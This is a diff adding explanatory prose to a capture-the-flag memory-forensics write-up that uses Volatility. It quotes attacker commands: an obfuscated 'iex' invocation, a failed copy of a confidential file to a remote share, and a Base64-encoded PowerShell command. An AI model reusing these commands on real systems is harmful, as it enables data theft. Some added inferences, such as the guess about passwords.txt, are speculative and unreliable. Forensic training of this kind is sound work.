@@ -25,6 +25,9 @@ recollection.bin: data
            Image date and time : 2022-12-19 16:07:30 UTC+0000
      Image local date and time : 2022-12-19 22:07:30 +0600
 ```
+
+The operating system of the machine is identified as Windows 7 Service Pack 1 x64 based on the suggested profiles from the Volatility framework. The memory dump was created on December 19, 2022, at 16:07:30 UTC. This information helps to set the context for the timeline and the environment in which the malicious activities took place.
+
 ---
 
 ### Question 3
@@ -38,6 +41,9 @@ Session    WindowStation Format                         Handle Object           
          1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260                                                   
          1 WinSta0       0x0L                              0x0 ------------------                                                   
 ```
+
+The obfuscated PowerShell command copied to the clipboard is `(gv '*MDR*').naMe[3,11,2]-joIN''`. This obfuscation technique is used to evade detection by making the command less readable. By using clipboard analysis, we can identify that the attacker prepared this command for execution, indicating the use of sophisticated methods to manipulate the system.
+
 ---
 
 ### Question 4
@@ -48,7 +54,8 @@ PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
 iex
 ```
 
-A quick Google search finds that [`iex` is a common abbreviation/alias for the `Invoke-Expression`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4#notes) cmdlet in PowerShell (basically the equivalent of `exec` or `eval` in other programming languages).
+
+The obfuscated command `(gv '*MDR*').naMe[3,11,2]-joIN''` is used as an alias for the `iex` cmdlet, which stands for `Invoke-Expression`. This cmdlet is commonly used to execute a string as a command, similar to `eval` in other programming languages. Recognizing this alias helps in understanding how the attacker intended to execute further malicious commands on the system.
 
 ---
 
@@ -56,8 +63,7 @@ A quick Google search finds that [`iex` is a common abbreviation/alias for the `
 `volatility --profile=Win7SP1x64 consoles -f recollection.bin`
 
 ```
-PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
-\pulice\pass.txt                                                                
+PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt                                                                
 The network path was not found.                                                 
 At line:1 char:47                                                               
 + type C:\Users\Public\Secret\Confidential.txt > <<<<  \\192.168.0.171\pulice\p 
@@ -65,13 +71,15 @@ ass.txt
     + CategoryInfo          : OpenError: (:) [], IOException                    
     + FullyQualifiedErrorId : FileOpenFailure                                   
 ```
+
+The full command line attempted by the attacker to exfiltrate the file is `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`. However, this attempt was unsuccessful as indicated by the error message "The network path was not found". This failure shows that the attacker did not manage to exfiltrate the intended file, possibly due to network configuration or the unavailability of the specified path.
+
 ---
 
 ### Question 7
 `volatility --profile=Win7SP1x64 consoles -f recollection.bin`
 ```
-PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1x
-QdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
+PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
 ```
 `ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi`
 
@@ -80,6 +88,9 @@ ccrollin@thinkpad-p43s:~/.../recollection$ base64 -d readme.txt
 echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
 ```
 `C:\Users\Public\Office\readme.txt`
+
+
+The attacker used a Base64-encoded PowerShell command to create a readme file with the content "hacked by mafia". The full path of this file is `C:\Users\Public\Office\readme.txt`. Decoding the Base64 string reveals the command, showing the attacker's method of concealing their actions through encoding.
 
 ---
 
@@ -98,6 +109,9 @@ The command completed successfully.
 
 `3`
 
+
+The host name of the machine is `USER-PC`, and there are three user accounts: Administrator, Guest, and user. This information is crucial for understanding the system configuration and potential targets for the attacker. The presence of multiple accounts can indicate various levels of access and privileges that the attacker might exploit.
+
 ---
 
 ### Question 10
@@ -108,6 +122,9 @@ ccrollin@thinkpad-p43s:~/.../recollection$ grep 'password' filescan.recollection
 ```
 
 `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`
+
+
+The full file location of `passwords.txt` is found within the Edge browser's user data directory at `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`. This file likely contains sensitive information, indicating that the attacker might have targeted it to gather credentials or other private data stored by the browser.
 
 ---
 
